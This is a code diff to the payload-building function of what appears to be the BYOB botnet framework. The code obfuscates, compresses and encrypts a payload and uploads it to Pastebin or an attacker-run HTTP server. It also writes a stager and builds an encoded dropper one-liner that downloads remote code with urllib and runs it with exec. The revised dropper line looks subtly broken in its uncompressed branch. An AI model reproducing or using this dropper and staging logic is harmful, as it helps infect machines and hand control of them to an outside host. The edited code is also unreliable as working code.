@@ -176,8 +176,8 @@ def run(options):
     Saves the output file to the ./byob/modules/payloads folder
 
     """
-    key     = base64.b64encode(os.urandom(16))
-    var     = generators.variable(3)
+    key = base64.b64encode(os.urandom(16))
+    var = generators.variable(3)
     imports = set()
     hidden_imports = set()
 
@@ -230,6 +230,7 @@ def run(options):
                                 util.display('\tadding {}...'.format(i), color='reset', style='dim')
                 else:
                     pass
+
     imports = list(imports)
     hidden_imports = list(hidden_imports)
     util.display("    [+]", color='green', style='bright', end=',')
@@ -244,27 +245,27 @@ def run(options):
         __load__= threading.Event()
         util.display("\n    Obfuscating payload...", color='reset', style='dim', end=',')
         __spin__= util.spinner(__load__)
-        output  = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
+        output = '\n'.join([line for line in generators.obfuscate(payload).rstrip().splitlines() if '=jobs' not in line])
         __load__.set()
         progress_update(payload, output, task='Obfuscation')
         payload = output
 
     if options.compress:
         util.display("\n    Compressing payload... ", color='reset', style='dim', end=',')
-        output  = generators.compress(payload)
+        output = generators.compress(payload)
         progress_update(payload, output, task='Compression')
         payload = output
 
     if options.encrypt:
         util.display("\n    Encrypting payload... ".format(key), color='reset', style='dim', end=',')
-        output  = generators.encrypt(payload, key)
+        output = generators.encrypt(payload, key)
         progress_update(payload, output, task='Encryption')
         payload = output
 
     # upload
     util.display("\n    Uploading payload... ", color='reset', style='dim', end=',')
     if options.pastebin:
-        url  = util.pastebin(payload, api_dev_key=options.pastebin)
+        url = util.pastebin(payload, api_dev_key=options.pastebin)
     else:
         dirs = ['modules/payloads','byob/modules/payloads','byob/byob/modules/payloads']
         dirname = '.'
@@ -274,9 +275,9 @@ def run(options):
         path = os.path.join(os.path.abspath(dirname), var + '.py' )
         with file(path, 'w') as fp:
             fp.write(payload)
-        s = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path.strip(os.path.join(os.getcwd(), 'modules'))))
+        s = 'http://{}:{}/{}/'.format(options.host, options.port, urllib.pathname2url(path.strip(os.path.join(os.getcwd(), 'modules'))))
         s = urllib2.urlparse.urlsplit(s)
-        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/')
+        url = urllib2.urlparse.urlunsplit((s.scheme, s.netloc, os.path.normpath(s.path), s.query, s.fragment)).replace('\\','/').replace('//payloads','/payloads')
         if url.endswith('.p'):
             url += 'y'
 
@@ -313,9 +314,9 @@ def run(options):
         path2 = os.path.join(os.path.abspath(dirname2), var + '.py' )
         with file(path2, 'w') as fp:
             fp.write(stager)
-        s2 = 'http://{}:{}/{}'.format(options.host, options.port, urllib.pathname2url(path2.strip(os.path.join(os.getcwd(), 'modules'))))
+        s2 = 'http://{}:{}/{}/'.format(options.host, int(options.port) + 1, urllib.pathname2url(path2.strip(os.path.join(os.getcwd(), 'modules'))))
         s2 = urllib2.urlparse.urlsplit(s2)
-        url2 = urllib2.urlparse.urlunsplit((s2.scheme, s2.netloc, os.path.normpath(s2.path), s2.query, s2.fragment)).replace('\\','/')
+        url2 = urllib2.urlparse.urlunsplit((s2.scheme, s2.netloc, os.path.normpath(s2.path), s2.query, s2.fragment)).replace('\\','/').replace('//tagers','/stagers')
         if url2.endswith('.p'):
             url2 += 'y'
 
@@ -329,7 +330,7 @@ def run(options):
     name = 'byob_{}.py'.format(var) if not options.name else options.name
     if not name.endswith('.py'):
         name += '.py'
-    dropper = "import zlib,base64,marshal;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(url2)))))))
+    dropper = "import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode({}))))".format(repr(base64.b64encode(zlib.compress(marshal.dumps("import zlib,base64,marshal,urllib;exec(marshal.loads(zlib.decompress(base64.b64decode(urllib.urlopen({}).read()))))".format(repr(url2)))))) if options.compress else repr(base64.b64encode(zlib.compress(marshal.dumps("urllib.urlopen({}).read()".format(repr(url2)))))))
     with file(name, 'w') as fp:
         fp.write(dropper)
 
